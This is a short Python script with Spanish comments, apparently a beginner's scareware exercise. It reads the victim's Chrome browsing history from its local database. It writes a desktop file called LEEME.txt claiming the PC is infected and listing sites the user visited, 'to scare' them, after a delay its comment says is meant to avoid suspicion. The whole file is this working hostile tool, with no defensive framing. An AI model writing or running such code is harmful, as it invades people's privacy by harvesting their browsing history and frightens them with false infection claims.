import os
import random
import sqlite3
import time


USER_DISK = os.path.splitdrive((os.getcwd())) [0]


def get_chrome_history(user_path):
    database_content = False
    while not database_content:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            database_content = True

            return urls
        except sqlite3.OperationalError:
            print("Error al abrir la base de datos... Se volvera a intentar en 15 segundos...")
            time.sleep(15)


def create_hack_file(user_path):
    try:
        hacker_file = open(user_path + "\\desktop\\" + "LEEME.txt", "w")
        hacker_file.write("Tu PC ha sido infectado\n")
        hacker_file.close()
        return hacker_file

    except:
        hacker_file = open("LEEME.txt", "w")
        hacker_file.write("Tu PC ha sido infectado\n")
        hacker_file.close()
        return hacker_file


def delay_action():
    n_hours = random.randrange(1, 4)
    n_minutes = random.randrange(1, 60)
    print("Durmiendo {} horas y {} minutos".format(n_hours, n_minutes))
    total_seconds = n_hours * 3600 + n_minutes * 60
    time.sleep(3)


def check_history_and_scare_user (hacker_file, chrome_history):
    for item in chrome_history[:10]:
        user_path = USER_DISK + "\\Users\\" + os.getlogin()
        try:
            hacker_file = open(user_path + "\\desktop\\" + "LEEME.txt", "a")
            hacker_file.write("he visto que has visitado la web {}, es algo interesante...\n".format(item[0]))
            hacker_file.close()
        except:
            hacker_file = open("LEEME.txt", "a")
            hacker_file.write("he visto que has visitado la web {}, es algo interesante...\n".format(item[0]))
            hacker_file.close()




def main():
    #Esperamos unas horas para no levantar sospechas
    delay_action()
    #Definimos la ruta del usuario
    user_path = USER_DISK + "\\Users\\" + os.getlogin()
    #Creamos un archivo
    hacker_file = create_hack_file(user_path)
    #Recojemos su historial
    chrome_history = get_chrome_history(user_path)
    #Escribimos mensajitos de miedo
    check_history_and_scare_user (hacker_file, chrome_history)


if __name__ == "__main__":
    main()
